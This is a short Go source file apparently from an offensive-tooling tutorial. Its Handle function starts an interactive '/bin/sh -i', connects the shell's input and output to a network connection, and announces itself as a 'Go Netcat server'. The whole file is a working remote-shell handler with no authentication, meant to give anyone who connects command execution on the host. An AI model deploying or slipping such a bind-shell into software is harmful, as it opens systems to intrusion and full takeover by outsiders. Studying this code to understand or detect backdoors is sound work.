package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {

	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (foo *Flusher) Write(b []byte) (int, error) {
	log.Println("Writing data to socket")
	if _, err := foo.w.Write(b); err != nil {
		log.Fatalln("Unable to write data")
	}

	if err := foo.w.Flush(); err != nil {
		log.Fatalln("Unable to flush data")
	}

	return len(b), nil
}

func Handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	log.Println("Created the command object")

	welcome := []byte("Welcome to the Go Netcat server\n")

	conn.Write(welcome)

	cmd.Stdin = conn
	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln("Unable to run command")
	}
}
